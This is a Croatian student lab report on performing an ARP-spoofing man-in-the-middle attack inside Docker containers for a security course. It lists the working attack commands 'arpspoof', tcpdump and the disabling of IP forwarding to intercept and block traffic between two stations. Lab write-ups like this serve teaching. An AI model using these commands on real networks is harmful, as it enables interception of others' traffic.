# 1. laboratorijska vježba

Reviewed: No

# ****Man-in-the-middle attack (ARP spoofing)****

Na 1. laboratorijskoj vježbi zadatak je bio realizirati Man in the middle napad. Kako bismo ga realizirali, koristili smo ranjivost ARP protokola te 3 virtualizirana Docker računala (eng. container): žrtve **station-1** i **station-2** te napadača **evil-station**. Pokrenuli smo Windows terminal te koristeći WSL (Windows Subsystem for Linux) pokrenuli Ubuntu.

Pozicionirali smo se u odgovarajući direktorij prema uputama profesora i klonirali ovaj GitHub repozitorij:

`git clone [https://github.com/mcagalj/SRP-2022-23](https://github.com/mcagalj/SRP-2022-23)`

Pomoću naredbe cd promijenili smo direktorij u onaj gdje su se nalazile skripte *start.sh* i *stop.sh* koje možemo pozvati za pokretanje/zaustavljanje virtualiziranog mrežnog scenarija:

`$ cd SRP-2022-23/arp-spoofing`

`$ ./start.sh`

`$ ./stop.sh`

`$ docker exec -it station-1 bash`

`$ ifconfig -a`

Trebalo je provjeriti je li station-2 na istoj mreži pa smo to uradili pomoću: 

`$ ping station-2`

To je bilo istinito. Pokrenuli smo shell station-2.

`$ docker exec -it station-2 bash`

Zatim smo ostvarili konekciju između station-1 i station-2 pomoću **netcat**-a.

`$ netcat -l -p 8080`

`$ netcat station-1 8080`

Sljedeći korak bio je napad. Pokrenuli smo shell za evil-station te isprobali **tcpdump** (omogućava praćenje prometa) i **arpspoof.**

`$ docker exec -it evil-station bash`

`$ arpspoof -t station-1 station-2`

`$ tcpdump` 

Mogli smo vidjeti da evil-station zapravo dobiva poruke od station-1 te ih preusmjerava k station-2. On ih dakle pročita. Da bismo zaustavili proslijeđivanje tj. prekinuli promet između station-1 i station-2, koristili smo:

`echo 0 > /proc/sys/net/ipv4/ip_forward`